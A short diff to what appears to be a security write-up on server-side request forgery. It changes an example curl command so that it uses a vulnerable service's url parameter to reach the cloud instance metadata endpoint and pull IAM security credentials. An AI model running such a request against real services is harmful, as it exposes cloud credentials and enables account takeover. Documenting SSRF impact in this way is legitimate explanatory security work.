@@ -7,9 +7,9 @@
 
 ### Access controls implemented in the service can be bypassed, leading to data leakage.
 
-- Retrieving instance metadata from cloud services [^1]
+- Retrieve security credentials from instance metadata [^1]
    ```bash
-   curl https://[VULNERABLE-SERVICE]/translate?url=http://169.254.169.254/latest/meta-data/
+   curl https://[VULNERABLE-SERVICE]/translate?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    ```
 
 - Read arbitrary files from the file system
